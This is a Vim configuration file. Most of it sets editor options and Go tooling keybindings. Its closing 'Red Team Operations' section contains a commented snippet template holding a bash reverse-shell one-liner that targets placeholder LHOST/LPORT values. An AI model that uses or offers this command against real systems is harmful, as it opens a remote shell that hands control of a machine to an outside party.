" Theme
syntax enable
colorscheme desert

" General VIM settings
set nocompatible
filetype indent on
filetype plugin indent on
set ignorecase
set nowrap
set number
set relativenumber
set ruler
set showcmd
set smartindent
set shiftwidth=2
set tabstop=2
set backspace=indent,eol,start

" Enable lsp for go by using gopls
let g:completor_filetype_map = {}
let g:completor_filetype_map.go = {'ft': 'lsp', 'cmd': 'gopls -remote=auto'}"

" Common Go commands
au FileType go nmap <leader>r <Plug>(go-run)
au FileType go nmap <leader>b <Plug>(go-build)
au FileType go nmap <leader>t <Plug>(go-test)
au FileType go nmap <leader>c <Plug>(go-coverage-toggle)
au FileType go nmap <Leader>e <Plug>(go-rename)
au FileType go nmap <Leader>s <Plug>(go-implements)
au FileType go nmap <Leader>i <Plug>(go-info)

" Use 8.2 popup windows for Go Doc
let g:go_doc_popup_window = 1

" ----------------------
" Red Team Operations
" ----------------------

" -- Syntax Highlighting --
" Enable syntax highlighting for common red team file types
au BufRead,BufNewFile *.ps1 set filetype=ps1
au BufRead,BufNewFile *.py set filetype=python
au BufRead,BufNewFile *.pl set filetype=perl
au BufRead,BufNewFile *.rb set filetype=ruby
au BufRead,BufNewFile *.php set filetype=php

" -- Snippets --
" To use snippets, you need a snippet engine like ultisnips or neosnippet.
" Once you have a snippet engine installed, you can add snippets like this:
" snippet revshell "Reverse Shell"
" 	bash -i >& /dev/tcp/LHOST/LPORT 0>&1
" endsnippet
